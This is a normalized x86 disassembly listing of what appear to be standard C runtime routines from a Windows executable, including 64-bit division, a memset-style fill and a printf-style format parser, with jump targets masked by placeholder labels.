pop ebp
retn
cmp [ ebp + 0x8 ] 0x5f
je r-xdata
pop ebp
retn
sub_40c79b
mov edi edi
push ebp
mov ebp esp
push 0x103
push [ ebp + 0x8 ]
call sub_413d6f
pop ecx
pop ecx
test eax eax
jne r-xdata
xor eax eax
inc eax
pop ebp
retn
cmp [ ebp + 0x8 ] 0x5f
je r-xdata
pop ebp
retn
sub_40c7c1
mov edi edi
push ebp
mov ebp esp
push 0x103
push [ ebp + 0x8 ]
call sub_413d6f
pop ecx
pop ecx
test eax eax
jne r-xdata
xor eax eax
inc eax
pop ebp
retn
cmp [ ebp + 0x8 ] 0x5f
je r-xdata
pop ebp
retn
sub_40c7f0
push esi
mov eax [ esp + 0x14 ]
or eax eax
jne r-xdata
mov ecx eax
mov ebx [ esp + 0x10 ]
mov edx [ esp + 0xc ]
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x10 ]
mov eax [ esp + 0xc ]
xor edx edx
div ecx
mov ebx eax
mov eax [ esp + 0x8 ]
div ecx
mov esi eax
mov eax ebx
mul [ esp + 0x10 ]
mov ecx eax
mov eax esi
mul [ esp + 0x10 ]
add edx ecx
jmp r-xdata
shr ecx 0x1
rcr ebx 0x1
shr edx 0x1
rcr eax 0x1
or ecx ecx
jne r-xdata
div ebx
mov esi eax
mul [ esp + 0x14 ]
mov ecx eax
mov eax [ esp + 0x10 ]
mul esi
add edx ecx
jb r-xdata
sub eax [ esp + 0x8 ]
sbb edx [ esp + 0xc ]
neg edx
neg eax
sbb edx 0x0
mov ecx edx
mov edx ebx
mov ebx ecx
mov ecx eax
mov eax esi
pop esi
retn 0x10
dec esi
sub eax [ esp + 0x10 ]
sbb edx [ esp + 0x14 ]
cmp edx [ esp + 0xc ]
ja r-xdata
jb r-xdata
xor ebx ebx
cmp eax [ esp + 0x8 ]
jbe r-xdata
sub_40c890
mov edx [ esp + 0xc ]
mov ecx [ esp + 0x4 ]
test edx edx
je r-xdata
mov eax [ esp + 0x4 ]
retn
xor eax eax
mov al [ esp + 0x8 ]
test al al
jne r-xdata
push edi
mov edi ecx
cmp edx 0x4
jb r-xdata
cmp edx 0x80
jb r-xdata
mov [ edi ] al
add edi 0x1
sub edx 0x1
jne r-xdata
neg ecx
and ecx 0x3
je r-xdata
cmp [ rwxdata ] 0x0
je r-xdata
mov eax [ esp + 0x8 ]
pop edi
retn
mov ecx eax
shl eax 0x8
add eax ecx
mov ecx eax
shl eax 0x10
add eax ecx
mov ecx edx
and edx 0x3
shr ecx 0x2
je r-xdata
sub edx ecx
jmp sub_413de3
[ edi ]
test edx edx
je r-xdata
mov [ edi ] al
add edi 0x1
sub ecx 0x1
jne r-xdata
sub_40c90a
mov edi edi
push ebp
mov ebp esp
push ebx
mov bl [ ebp + 0x10 ]
push esi
mov esi [ ebp + 0x8 ]
mov al [ esi + 0x8 ]
cmp al 0x70
je r-xdata
xor ecx ecx
cmp al bl
sete cl
mov eax ecx
cmp bl 0x70
je r-xdata
cmp al 0x73
je r-xdata
xor edx edx
inc edx
cmp al 0x53
je r-xdata
xor ecx ecx
inc ecx
cmp bl 0x53
je r-xdata
xor edx edx
jmp r-xdata
cmp edx ecx
jne r-xdata
test ecx ecx
jne r-xdata
xor ecx ecx
jmp r-xdata
cmp bl 0x73
je r-xdata
xor eax eax
jmp r-xdata
mov ecx [ esi + 0xc ]
mov edx [ ebp + 0x14 ]
mov eax 0x810
and ecx eax
neg ecx
sbb ecx ecx
and edx eax
neg ecx
neg edx
sbb edx edx
neg edx
cmp ecx edx
jne r-xdata
mov dl 0x64
cmp al dl
je r-xdata
test edx edx
jne r-xdata
pop esi
pop ebx
pop ebp
retn
xor eax eax
inc eax
jmp r-xdata
xor ecx ecx
inc ecx
cmp al 0x69
je r-xdata
xor eax eax
inc eax
cmp bl 0x69
je r-xdata
cmp al dl
je r-xdata
cmp al 0x6f
je r-xdata
mov eax [ esi + 0xc ]
mov ecx eax
xor ecx [ ebp + 0x14 ]
test ecx 0x10000
jne r-xdata
cmp bl 0x6f
je r-xdata
cmp al 0x69
je r-xdata
cmp al 0x75
je r-xdata
xor eax [ ebp + 0x14 ]
test al 0x20
jne r-xdata
cmp bl 0x75
je r-xdata
cmp al 0x6f
je r-xdata
cmp al 0x78
je r-xdata
mov ecx [ esi ]
xor eax eax
cmp ecx [ ebp + 0xc ]
sete al
jmp r-xdata
cmp bl 0x78
je r-xdata
cmp al 0x75
je r-xdata
cmp al 0x58
je r-xdata
cmp bl 0x58
je r-xdata
cmp al 0x78
je r-xdata
cmp bl dl
je r-xdata
xor eax eax
jmp r-xdata
cmp al 0x58
je r-xdata
cmp bl 0x69
je r-xdata
cmp ecx eax
jne r-xdata
xor ecx ecx
jmp r-xdata
cmp bl 0x6f
je r-xdata
cmp bl dl
je r-xdata
cmp bl 0x75
je r-xdata
cmp bl 0x78
je r-xdata
cmp bl 0x58
jne r-xdata
sub_40ca35
test [ ecx + 0xc ] 0x40
je r-xdata
dec [ ecx + 0x4 ]
js r-xdata
cmp [ ecx + 0x8 ] 0x0
je r-xdata
movsx eax al
push ecx
push eax
call sub_40679c
pop ecx
pop ecx
mov edx [ ecx ]
mov [ edx ] al
inc [ ecx ]
movzx eax al
jmp r-xdata
inc [ esi ]
retn
or [ esi ] eax
retn
cmp eax 0xffffffff
jne r-xdata
sub_40ca68
mov edi edi
push ebp
mov ebp esp
push esi
mov esi eax
jmp r-xdata
cmp [ ebp + 0xc ] 0x0
jg r-xdata
mov ecx [ ebp + 0x10 ]
mov al [ ebp + 0x8 ]
dec [ ebp + 0xc ]
call sub_40ca35
cmp [ esi ] 0xffffffff
je r-xdata
pop esi
pop ebp
retn
sub_40ca8e
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi eax
mov ebx ecx
call sub_4078ae
test [ edi + 0xc ] 0x40
mov eax [ eax ]
mov [ ebp - 0x4 ] eax
je r-xdata
call sub_4078ae
and [ eax ] 0x0
jmp r-xdata
cmp [ edi + 0x8 ] 0x0
jne r-xdata
test ebx ebx
jg r-xdata
add [ esi ] ebx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov al [ eax ]
mov ecx edi
dec ebx
call sub_40ca35
inc [ ebp + 0x8 ]
cmp [ esi ] 0xffffffff
jne r-xdata
call sub_4078ae
cmp [ eax ] 0x0
jne r-xdata
pop esi
pop ebx
leave
retn
call sub_4078ae
cmp [ eax ] 0x2a
jne r-xdata
call sub_4078ae
mov ecx [ ebp - 0x4 ]
mov [ eax ] ecx
mov ecx edi
mov al 0x3f
call sub_40ca35
sub_40cb17
mov edi edi
push ebp
mov ebp esp
sub esp 0x8d0
mov eax [ rwxdata ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x14 ]
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
push [ ebp + 0x10 ]
mov edi [ ebp + 0xc ]
xor ebx ebx
lea ecx [ ebp - 0x878 ]
mov [ ebp - 0x8b8 ] esi
mov [ ebp - 0x854 ] eax
mov [ ebp - 0x8b4 ] ebx
mov [ ebp - 0x850 ] ebx
mov [ ebp - 0x898 ] ebx
mov [ ebp - 0x8bc ] ebx
mov [ ebp - 0x8a4 ] ebx
call sub_406900
or [ ebp - 0x860 ] 0xffffffff
mov [ ebp - 0x89c ] ebx
cmp esi ebx
jne r-xdata
test [ esi + 0xc ] 0x40
jne r-xdata
call sub_4078ae
mov [ eax ] 0x16
call sub_407823
cmp [ ebp - 0x86c ] bl
cmp edi ebx
je r-xdata
push esi
call sub_408ec3
pop ecx
mov edx rwxdata
cmp eax 0xffffffff
je r-xdata
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x870 ]
and [ eax + 0x70 ] 0xfffffffd
mov [ ebp - 0x87c ] ebx
mov [ ebp - 0x8cc ] edi
mov [ ebp - 0x864 ] ebx
mov ecx edx
cmp eax 0xfffffffe
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_405894
leave
retn
mov eax [ ebp - 0x8cc ]
or [ ebp - 0x894 ] 0xffffffff
or [ ebp - 0x880 ] 0xffffffff
or [ ebp - 0x860 ] 0xffffffff
mov [ ebp - 0x8a8 ] ebx
mov [ ebp - 0x8a0 ] ebx
mov [ ebp - 0x8b0 ] ebx
mov [ ebp - 0x890 ] ebx
mov [ ebp - 0x858 ] ebx
mov bl [ eax ]
mov [ ebp - 0x85c ] bl
test bl bl
je r-xdata
cmp [ ebp - 0x860 ] ebx
je r-xdata
cmp eax 0xffffffff
je r-xdata
mov ecx eax
and ecx 0x1f
mov esi eax
sar esi 0x5
shl ecx 0x6
add ecx [ esi * 4 + rwxdata ]
jmp r-xdata
inc [ ebp - 0x864 ]
cmp [ ebp - 0x864 ] 0x2
jge r-xdata
mov esi eax
jmp r-xdata
cmp [ ebp - 0x86c ] 0x0
je r-xdata
xor ebx ebx
mov eax edx
cmp eax 0xfffffffe
je r-xdata
test [ ecx + 0x24 ] 0x7f
jne r-xdata
xor ebx ebx
jmp r-xdata
inc esi
cmp [ ebp - 0x87c ] 0x0
mov [ ebp - 0x884 ] esi
jl r-xdata
mov eax [ ebp - 0x87c ]
mov eax [ ebp - 0x870 ]
and [ eax + 0x70 ] 0xfffffffd
mov ecx eax
and eax 0x1f
sar ecx 0x5
shl eax 0x6
add eax [ ecx * 4 + rwxdata ]
jmp r-xdata
cmp [ ebp - 0x864 ] 0x1
jne r-xdata
xor esi esi
cmp [ ebp - 0x8a0 ] esi
je r-xdata
lea eax [ ebx - 0x20 ]
cmp al 0x58
ja r-xdata
test [ eax + 0x24 ] 0x80
jne r-xdata
cmp [ ebp - 0x860 ] 0x1
jne r-xdata
cmp [ ebp - 0x8a0 ] 0x7
jne r-xdata
xor eax eax
movsx eax bl
movzx eax [ eax + r--data ]
and eax 0xf
jmp r-xdata
cmp [ ebp - 0x864 ] esi
jne r-xdata
call sub_4078ae
mov [ eax ] 0x16
call sub_407823
cmp [ ebp - 0x86c ] 0x0
jmp r-xdata
cmp eax 0x8
je r-xdata
cmp [ esi ] 0x25
je r-xdata
mov edx [ ebp - 0x8a0 ]
imul eax eax 0x9
movzx eax [ eax + edx + r--data ]
xor edi edi
shr eax 0x4
inc edi
xor ecx ecx
mov [ ebp - 0x8a0 ] eax
cmp eax edi
jne r-xdata
cmp [ ebp - 0x894 ] esi
jl r-xdata
je r-xdata
cmp eax 0x7
ja r-xdata
mov edx [ ebp - 0x880 ]
mov eax [ ebp - 0x8a0 ]
jmp [ eax * 4 + r-xdata ]
cmp [ ebp - 0x860 ] 0xffffffff
jne r-xdata
mov edx [ ebp - 0x854 ]
lea eax [ ebp - 0x648 ]
mov esi [ ebp - 0x884 ]
mov al [ esi ]
mov [ ebp - 0x85c ] al
test al al
jne r-xdata
jmp r-xdata
cmp [ ebp - 0x860 ] edi
jne r-xdata
push 0xa
lea eax [ ebp - 0x89c ]
push eax
push esi
call sub_4140c8
add esp 0xc
test eax eax
jle r-xdata
mov [ eax ] edx
add edx 0x4
dec ecx
je r-xdata
mov bl [ ebp - 0x85c ]
push 0xa
lea eax [ ebp - 0x89c ]
push eax
push esi
call sub_4140c8
mov ecx [ ebp - 0x89c ]
add esp 0xc
dec eax
cmp [ ebp - 0x864 ] 0x0
lea edx [ ecx + 0x1 ]
mov [ ebp - 0x880 ] eax
mov [ ebp - 0x884 ] edx
jne r-xdata
and [ ebp - 0x860 ] 0x0
xor ecx ecx
mov eax [ ebp - 0x89c ]
cmp [ eax ] 0x24
jne r-xdata
mov ecx [ eax - 0x4 ]
dec ecx
je r-xdata
dec ecx
je r-xdata
xor ecx ecx
mov esi edx
test eax eax
js r-xdata
cmp [ ebp - 0x864 ] 0x0
jne r-xdata
dec ecx
je r-xdata
cmp [ ecx ] 0x24
jne r-xdata
mov [ ebp - 0x860 ] edi
jmp r-xdata
push 0x640
lea eax [ ebp - 0x64c ]
push 0x0
push eax
call sub_40c890
add esp 0xc
mov [ eax ] edx
add edx 0x8
jmp r-xdata
dec ecx
je r-xdata
cmp eax 0x64
jge r-xdata
inc esi
add eax 0x10
mov [ ebp - 0x854 ] edx
cmp esi [ ebp - 0x894 ]
jle r-xdata
dec ecx
je r-xdata
cmp eax [ ebp - 0x894 ]
jle r-xdata
dec ecx
dec ecx
jne r-xdata
mov [ ebp - 0x894 ] eax
sub_40de03
test [ ecx + 0xc ] 0x40
je r-xdata
dec [ ecx + 0x4 ]
js r-xdata
cmp [ ecx + 0x8 ] 0x0
je r-xdata
movsx eax al
push ecx
push eax
call sub_40679c
pop ecx
pop ecx
mov edx [ ecx ]
mov [ edx ] al
inc [ ecx ]
movzx eax al
jmp r-xdata
inc [ esi ]
retn
or [ esi ] eax
retn
cmp eax 0xffffffff
jne r-xdata
sub_40de36
mov edi edi
push ebp
mov ebp esp
push esi
mov esi eax
jmp r-xdata
cmp [ ebp + 0xc ] 0x0
jg r-xdata
mov ecx [ ebp + 0x10 ]
mov al [ ebp + 0x8 ]
dec [ ebp + 0xc ]
call sub_40de03
cmp [ esi ] 0xffffffff
je r-xdata
pop esi
pop ebp
retn
sub_40de5c
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi eax
mov ebx ecx
call sub_4078ae
test [ edi + 0xc ] 0x40
mov eax [ eax ]
mov [ ebp - 0x4 ] eax
je r-xdata
call sub_4078ae
and [ eax ] 0x0
jmp r-xdata
cmp [ edi + 0x8 ] 0x0
jne r-xdata
test ebx ebx
jg r-xdata
add [ esi ] ebx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov al [ eax ]
mov ecx edi
dec ebx
call sub_40de03
inc [ ebp + 0x8 ]
cmp [ esi ] 0xffffffff
jne r-xdata
call sub_4078ae
cmp [ eax ] 0x0
jne r-xdata
pop esi
pop ebx
leave
retn
call sub_4078ae
cmp [ eax ] 0x2a
jne r-xdata
call sub_4078ae
mov ecx [ ebp - 0x4 ]
mov [ eax ] ecx
mov ecx edi
mov al 0x3f
call sub_40de03
sub_40ded0
mov edi edi
push ebp
mov ebp esp
sub esp 0x278
mov eax [ rwxdata ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0x14 ]
push esi
mov esi [ ebp + 0x8 ]
xor eax eax
push edi
push [ ebp + 0x10 ]
mov edi [ ebp + 0xc ]
lea ecx [ ebp - 0x250 ]
mov [ ebp - 0x258 ] esi
mov [ ebp - 0x228 ] ebx
mov [ ebp - 0x260 ] eax
mov [ ebp - 0x210 ] eax
mov [ ebp - 0x234 ] eax
mov [ ebp - 0x218 ] eax
mov [ ebp - 0x230 ] eax
mov [ ebp - 0x25c ] eax
mov [ ebp - 0x238 ] eax
call sub_406900
test esi esi
jne r-xdata
test [ esi + 0xc ] 0x40
jne r-xdata
call sub_4078ae
mov [ eax ] 0x16
call sub_407823
cmp [ ebp - 0x244 ] 0x0
je r-xdata
xor esi esi
cmp edi esi
je r-xdata
push esi
call sub_408ec3
pop ecx
mov edx rwxdata
cmp eax 0xffffffff
je r-xdata
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x248 ]
and [ eax + 0x70 ] 0xfffffffd
mov dl [ edi ]
mov [ ebp - 0x224 ] esi
mov [ ebp - 0x220 ] esi
mov [ ebp - 0x240 ] esi
mov [ ebp - 0x254 ] esi
mov [ ebp - 0x211 ] dl
test dl dl
je r-xdata
mov ecx edx
cmp eax 0xfffffffe
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_405894
leave
retn
cmp [ ebp - 0x244 ] 0x0
je r-xdata
inc edi
mov [ ebp - 0x23c ] edi
cmp [ ebp - 0x224 ] esi
jl r-xdata
cmp eax 0xffffffff
je r-xdata
mov ecx eax
and ecx 0x1f
mov esi eax
sar esi 0x5
shl ecx 0x6
add ecx [ esi * 4 + rwxdata ]
jmp r-xdata
mov eax [ ebp - 0x224 ]
mov eax [ ebp - 0x248 ]
and [ eax + 0x70 ] 0xfffffffd
cmp [ ebp - 0x240 ] 0x0
je r-xdata
lea eax [ edx - 0x20 ]
cmp al 0x58
ja r-xdata
mov eax edx
cmp eax 0xfffffffe
je r-xdata
test [ ecx + 0x24 ] 0x7f
jne r-xdata
cmp [ ebp - 0x240 ] 0x7
jne r-xdata
xor eax eax
movsx eax dl
movzx eax [ eax + r--data ]
and eax 0xf
jmp r-xdata
mov ecx eax
and eax 0x1f
sar ecx 0x5
shl eax 0x6
add eax [ ecx * 4 + rwxdata ]
jmp r-xdata
push 0x7
pop ecx
cmp eax ecx
ja r-xdata
mov ecx [ ebp - 0x240 ]
imul eax eax 0x9
movzx eax [ eax + ecx + r--data ]
push 0x8
shr eax 0x4
pop esi
mov [ ebp - 0x240 ] eax
cmp eax esi
je r-xdata
test [ eax + 0x24 ] 0x80
jne r-xdata
mov edi [ ebp - 0x23c ]
mov al [ edi ]
mov [ ebp - 0x211 ] al
test al al
je r-xdata
jmp [ eax * 4 + jump_table_40ea80 ]
mov ebx [ ebp - 0x228 ]
xor esi esi
mov dl al
jmp r-xdata
xor eax eax
or [ ebp - 0x218 ] 0xffffffff
mov [ ebp - 0x26c ] eax
mov [ ebp - 0x25c ] eax
mov [ ebp - 0x234 ] eax
mov [ ebp - 0x230 ] eax
mov [ ebp - 0x210 ] eax
mov [ ebp - 0x238 ] eax
jmp r-xdata
movsx eax dl
sub eax 0x20
je r-xdata
cmp dl 0x2a
jne r-xdata
and [ ebp - 0x218 ] 0x0
jmp r-xdata
cmp dl 0x2a
jne r-xdata
cmp dl 0x49
je r-xdata
and [ ebp - 0x238 ] 0x0
lea eax [ ebp - 0x250 ]
push eax
movzx eax dl
push eax
call sub_40c530
pop ecx
test eax eax
mov al [ ebp - 0x211 ]
pop ecx
je r-xdata
movsx eax dl
cmp eax 0x64
jg r-xdata
or [ ebp - 0x210 ] 0x2
jmp r-xdata
sub eax 0x3
je r-xdata
mov eax [ ebp - 0x234 ]
imul eax eax 0xa
movsx ecx dl
lea eax [ eax + ecx - 0x30 ]
mov [ ebp - 0x234 ] eax
jmp r-xdata
add ebx 0x4
mov [ ebp - 0x228 ] ebx
mov ebx [ ebx - 0x4 ]
mov [ ebp - 0x234 ] ebx
test ebx ebx
jns r-xdata
mov eax [ ebp - 0x218 ]
imul eax eax 0xa
movsx ecx dl
lea eax [ eax + ecx - 0x30 ]
mov [ ebp - 0x218 ] eax
jmp r-xdata
add ebx 0x4
mov [ ebp - 0x228 ] ebx
mov ebx [ ebx - 0x4 ]
mov [ ebp - 0x218 ] ebx
test ebx ebx
jns r-xdata
mov al [ edi ]
cmp al 0x36
jne r-xdata
cmp dl 0x68
je r-xdata
mov ecx [ ebp - 0x258 ]
lea esi [ ebp - 0x224 ]
call sub_40de03
jmp r-xdata
mov ecx [ ebp - 0x258 ]
lea esi [ ebp - 0x224 ]
call sub_40de03
mov al [ edi ]
inc edi
mov [ ebp - 0x23c ] edi
test al al
je r-xdata
cmp eax 0x70
jg r-xdata
je r-xdata
or [ ebp - 0x210 ] 0x80
jmp r-xdata
sub eax esi
je r-xdata
or [ ebp - 0x210 ] 0x4
neg [ ebp - 0x234 ]
jmp r-xdata
or [ ebp - 0x218 ] 0xffffffff
jmp r-xdata
cmp al 0x33
jne r-xdata
cmp [ edi + 0x1 ] 0x34
jne r-xdata
or [ ebp - 0x210 ] 0x20
jmp r-xdata
cmp dl 0x6c
je r-xdata
sub eax 0x73
je r-xdata
je r-xdata
or [ ebp - 0x210 ] 0x40
cmp eax 0x53
jg r-xdata
or [ ebp - 0x210 ] 0x1
jmp r-xdata
dec eax
dec eax
je r-xdata
cmp al 0x64
je r-xdata
cmp [ edi + 0x1 ] 0x32
jne r-xdata
add edi 0x2
or [ ebp - 0x210 ] 0x8000
mov [ ebp - 0x23c ] edi
jmp r-xdata
cmp [ edi ] 0x6c
jne r-xdata
cmp dl 0x77
jne r-xdata
mov ecx [ ebp - 0x218 ]
cmp ecx 0xffffffff
jne r-xdata
dec eax
dec eax
je r-xdata
mov [ ebp - 0x218 ] esi
cmp eax 0x65
jl r-xdata
test ecx 0x1000
jne r-xdata
add ebx esi
mov eax [ ebx - 0x8 ]
mov edx [ ebx - 0x4 ]
jmp r-xdata
sub eax 0x58
je r-xdata
je r-xdata
or [ ebp - 0x210 ] 0x4
jmp r-xdata
sub eax 0x3
jne r-xdata
cmp al 0x69
je r-xdata
add edi 0x2
and [ ebp - 0x210 ] 0xffff7fff
mov [ ebp - 0x23c ] edi
jmp r-xdata
or [ ebp - 0x210 ] 0x10
jmp r-xdata
inc edi
or [ ebp - 0x210 ] 0x1000
mov [ ebp - 0x23c ] edi
jmp r-xdata
or [ ebp - 0x210 ] 0x800
jmp r-xdata
add ebx 0x4
test [ ebp - 0x210 ] 0x810
mov [ ebp - 0x228 ] ebx
mov ebx [ ebx - 0x4 ]
mov [ ebp - 0x21c ] ebx
je r-xdata
mov ecx 0x7fffffff
mov [ ebp - 0x220 ] 0xa
sub eax 0x3
jne r-xdata
test [ ebp - 0x210 ] 0x80
mov [ ebp - 0x220 ] 0x10
je r-xdata
cmp [ ebp - 0x25c ] 0x0
jne r-xdata
cmp eax 0x67
jle r-xdata
add ebx 0x4
test cl 0x20
je r-xdata
mov [ ebp - 0x228 ] ebx
mov [ ebp - 0x260 ] ecx
jmp r-xdata
dec eax
dec eax
je r-xdata
test [ ebp - 0x210 ] 0x830
jne r-xdata
sub eax 0x41
je r-xdata
or [ ebp - 0x210 ] esi
jmp r-xdata
cmp al 0x6f
je r-xdata
test ebx ebx
jne r-xdata
test ebx ebx
jne r-xdata
mov [ ebp - 0x260 ] 0x27
mov ecx [ ebp - 0x210 ]
test ecx 0x8000
je r-xdata
mov al [ ebp - 0x260 ]
add al 0x51
mov [ ebp - 0x22c ] 0x30
mov [ ebp - 0x22b ] al
mov [ ebp - 0x230 ] 0x2
jmp r-xdata
cmp [ ebp - 0x254 ] 0x0
je r-xdata
mov eax [ ebp - 0x210 ]
test al 0x40
je r-xdata
or [ ebp - 0x210 ] 0x40
cmp [ ebp - 0x218 ] 0x0
lea edi [ ebp - 0x20c ]
mov eax 0x200
mov [ ebp - 0x21c ] edi
mov [ ebp - 0x264 ] eax
jge r-xdata
cmp eax 0x69
je r-xdata
mov eax [ ebx - 0x4 ]
test cl 0x40
je r-xdata
mov [ ebp - 0x228 ] ebx
test cl 0x40
je r-xdata
test [ ebp - 0x210 ] 0x9000
mov ebx edx
mov edi eax
jne r-xdata
test edx edx
jg r-xdata
mov eax [ ebx ]
add ebx 0x4
mov [ ebp - 0x228 ] ebx
test eax eax
je r-xdata
sub eax ecx
je r-xdata
or [ ebp - 0x210 ] 0x800
add dl 0x20
mov [ ebp - 0x26c ] 0x1
mov [ ebp - 0x211 ] dl
dec eax
dec eax
je r-xdata
cmp al 0x75
je r-xdata
mov eax [ ebp - 0x21c ]
jmp r-xdata
mov eax [ rwxdata ]
mov [ ebp - 0x21c ] eax
mov eax [ ebp - 0x21c ]
mov [ ebp - 0x238 ] 0x1
jmp r-xdata
mov eax [ rwxdata ]
mov [ ebp - 0x21c ] eax
push [ ebp - 0x254 ]
call sub_409812
and [ ebp - 0x254 ] 0x0
pop ecx
mov ebx [ ebp - 0x234 ]
sub ebx [ ebp - 0x220 ]
sub ebx [ ebp - 0x230 ]
mov [ ebp - 0x264 ] ebx
test al 0xc
jne r-xdata
test eax 0x100
je r-xdata
jne r-xdata
mov [ ebp - 0x218 ] 0x6
jmp r-xdata
cmp eax 0x6e
je r-xdata
xor edx edx
cdq
jmp r-xdata
movzx eax [ ebx - 0x4 ]
movsx eax [ ebx - 0x4 ]
jmp r-xdata
cmp [ ebp - 0x218 ] 0x0
jge r-xdata
xor ebx ebx
jl r-xdata
mov eax [ rwxdata ]
mov [ ebp - 0x21c ] eax
push eax
mov ecx [ eax + 0x4 ]
test ecx ecx
je r-xdata
dec eax
dec eax
jne r-xdata
test [ ebp - 0x210 ] 0x830
jne r-xdata
dec eax
dec eax
je r-xdata
cmp al 0x78
je r-xdata
test ecx ecx
jne r-xdata
test ecx ecx
jne r-xdata
mov edi [ ebp - 0x258 ]
mov ecx [ ebp - 0x230 ]
lea eax [ ebp - 0x22c ]
push eax
lea eax [ ebp - 0x224 ]
call sub_40de5c
test [ ebp - 0x210 ] 0x8
pop ecx
je r-xdata
mov edi ebx
test ebx ebx
jle r-xdata
test al 0x1
je r-xdata
mov [ ebp - 0x22c ] 0x2d
jmp r-xdata
cmp [ ebp - 0x218 ] eax
jle r-xdata
cmp dl 0x67
jne r-xdata
mov eax [ ebx ]
mov esi [ DecodePointer@IAT ]
add ebx 0x8
mov [ ebp - 0x278 ] eax
mov eax [ ebx - 0x4 ]
mov [ ebp - 0x274 ] eax
lea eax [ ebp - 0x250 ]
push eax
push [ ebp - 0x26c ]
movsx eax dl
push [ ebp - 0x218 ]
mov [ ebp - 0x228 ] ebx
push eax
push [ ebp - 0x264 ]
lea eax [ ebp - 0x278 ]
push edi
push eax
push [ rwxdata ]
call esi
call eax
mov ebx [ ebp - 0x210 ]
add esp 0x1c
and ebx 0x80
je r-xdata
mov esi [ ebx ]
add ebx 0x4
mov [ ebp - 0x228 ] ebx
call sub_40c298
test eax eax
je r-xdata
cmp eax 0x6f
jne r-xdata
test cl 0x40
je r-xdata
cdq
jmp r-xdata
and [ ebp - 0x210 ] 0xfffffff7
mov eax 0x200
cmp [ ebp - 0x218 ] eax
jle r-xdata
mov [ ebp - 0x218 ] 0x1
jmp r-xdata
neg eax
adc edx 0x0
neg edx
or [ ebp - 0x210 ] 0x100
test eax eax
jae r-xdata
mov [ ebp - 0x220 ] eax
test [ ebp - 0x210 ] 0x800
movsx eax [ eax ]
mov [ ebp - 0x21c ] ecx
je r-xdata
add ebx 0x4
test [ ebp - 0x210 ] 0x810
mov [ ebp - 0x228 ] ebx
je r-xdata
or [ ebp - 0x210 ] 0x800
jmp r-xdata
dec eax
dec eax
jne r-xdata
cmp al 0x58
je r-xdata
dec ecx
cmp [ eax ] 0x0
je r-xdata
sub eax [ ebp - 0x21c ]
dec ecx
cmp [ eax ] 0x0
je r-xdata
sub eax [ ebp - 0x21c ]
sar eax 0x1
jmp r-xdata
cmp [ ebp - 0x238 ] 0x0
mov ebx [ ebp - 0x220 ]
je r-xdata
test [ ebp - 0x210 ] 0x4
jne r-xdata
mov ecx [ ebp - 0x258 ]
lea esi [ ebp - 0x224 ]
mov al 0x20
dec edi
call sub_40de03
cmp [ ebp - 0x224 ] 0xffffffff
je r-xdata
test al 0x2
je r-xdata
mov [ ebp - 0x22c ] 0x2b
jmp r-xdata
mov [ ebp - 0x230 ] 0x1
cmp [ ebp - 0x218 ] 0xa3
jle r-xdata
mov [ ebp - 0x218 ] eax
mov [ ebp - 0x218 ] 0x1
jmp r-xdata
cmp [ ebp - 0x211 ] 0x67
jne r-xdata
cmp [ ebp - 0x218 ] 0x0
jne r-xdata
test [ ebp - 0x210 ] 0x20
je r-xdata
test [ ebp - 0x210 ] 0x80
mov [ ebp - 0x220 ] esi
je r-xdata
mov eax edi
or eax ebx
jne r-xdata
mov [ ebp - 0x218 ] eax
and [ ebp - 0x238 ] 0x0
jmp r-xdata
cdq
sub eax edx
sar eax 0x1
mov [ ebp - 0x238 ] 0x1
jmp r-xdata
mov al [ ebx - 0x4 ]
mov [ ebp - 0x20c ] al
mov [ ebp - 0x220 ] 0x1
movzx eax [ ebx - 0x4 ]
push eax
push 0x200
lea eax [ ebp - 0x20c ]
push eax
lea eax [ ebp - 0x220 ]
push eax
call sub_40c490
add esp 0x10
test eax eax
je r-xdata
and [ ebp - 0x240 ] 0x0
inc eax
add eax 0x2
push [ ebp - 0x21c ]
lea eax [ ebp - 0x224 ]
mov ecx ebx
call sub_40de5c
pop ecx
test ebx ebx
jle r-xdata
jmp r-xdata
test edi edi
jg r-xdata
mov [ ebp - 0x22c ] 0x20
mov esi [ ebp - 0x218 ]
add esi 0x15d
push esi
call sub_40c01b
mov dl [ ebp - 0x211 ]
pop ecx
mov [ ebp - 0x254 ] eax
test eax eax
je r-xdata
cmp [ edi ] 0x2d
jne r-xdata
test ebx ebx
jne r-xdata
lea eax [ ebp - 0x250 ]
push eax
push edi
push [ rwxdata ]
call esi
call eax
pop ecx
pop ecx
mov eax [ ebp - 0x224 ]
mov [ esi ] eax
mov ax [ ebp - 0x224 ]
mov [ esi ] ax
jmp r-xdata
or [ ebp - 0x210 ] 0x200
jmp r-xdata
lea esi [ ebp - 0xd ]
and [ ebp - 0x230 ] eax
lea eax [ ebp - 0x20c ]
mov [ ebp - 0x21c ] eax
jmp r-xdata
mov [ ebp - 0x25c ] 0x1
jmp r-xdata
test [ ebp - 0x210 ] 0x4
je r-xdata
mov esi [ ebp - 0x21c ]
test ebx ebx
jg r-xdata
mov [ ebp - 0x218 ] 0xa3
mov [ ebp - 0x21c ] eax
mov [ ebp - 0x264 ] esi
mov edi eax
jmp r-xdata
push edi
jmp r-xdata
or [ ebp - 0x210 ] 0x100
inc edi
mov [ ebp - 0x21c ] edi
lea eax [ ebp - 0x250 ]
push eax
push edi
push [ rwxdata ]
call esi
call eax
pop ecx
pop ecx
mov [ ebp - 0x25c ] 0x1
jmp r-xdata
mov eax [ ebp - 0x220 ]
cdq
push edx
push eax
push ebx
push edi
call sub_40c7f0
add ecx 0x30
mov [ ebp - 0x264 ] ebx
mov edi eax
mov ebx edx
cmp ecx 0x39
jle r-xdata
mov eax edi
or eax ebx
je r-xdata
mov ebx [ ebp - 0x264 ]
jmp r-xdata
or [ ebp - 0x224 ] 0xffffffff
jmp r-xdata
mov ecx [ ebp - 0x270 ]
test ecx ecx
je r-xdata
lea esi [ ebp - 0x224 ]
mov ecx edi
